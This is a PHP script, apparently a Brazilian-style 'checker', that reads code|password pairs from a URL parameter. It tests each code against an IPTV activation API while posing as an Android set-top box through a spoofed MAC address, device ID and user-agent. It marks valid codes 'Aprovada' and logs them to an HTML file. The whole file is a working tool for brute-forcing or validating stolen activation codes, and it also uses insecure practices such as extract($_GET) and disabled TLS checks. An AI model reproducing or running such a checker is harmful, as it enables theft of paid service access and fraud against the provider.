
<?php

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

extract($_GET);

function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$email = multiexplode(array(":", "|", ""), $lista)[0];
$senha = multiexplode(array(":", "|", ""), $lista)[1];


function getStr($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}	





	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://activecode-xplus.xyz/api/active-codes/actions/get-data?code=".$email."&mac=02%3A00%3A00%3A44%3A55%3A66&uid=d5d3651f7b0d03ee&app_name=live-p2&device_type=android-box&appver=3.8");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip',
'accept-language: ar',
'cache-control: no-cache',
'connection: Keep-Alive',
'host: activecode-xplus.xyz',
'user-agent: X-Plus 84'));
	curl_setopt($ch, CURLOPT_POST, 0);
	   $resposta = curl_exec($ch);
	
$retorno = getStr($resposta, '"message":"','"');
$retorno1 = getStr($resposta, '"errors":"','"');

if (stripos($resposta, '"success":true')){ 

echo "<span style='background: linear-gradient(to right, rgb(90, 244, 95) 0%, rgb(90, 244, 95)0%, rgb(90, 244, 95) 100%);
	; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'> #Aprovada </span>&nbsp <span style='background: linear-gradient(to right, rgb(93, 90, 244, 1) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);
	; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'> [$email|$senha] >> Retorno: $retorno";
					$file = fopen("Aprovadas.html", "a");
		fwrite($file, "$email|$senha &nbsp&nbsp&nbsp&nbsp&nbsp >> Retorno: $retorno <br>");
		exit();
		flush();
		ob_flush();
	}else{
				echo "<span class='badge badge-danger'> Reprovada </span> &nbsp [ $email|$senha ]  >> Retorno: $retorno $retorno1";

		flush();
		ob_flush();
	}






?>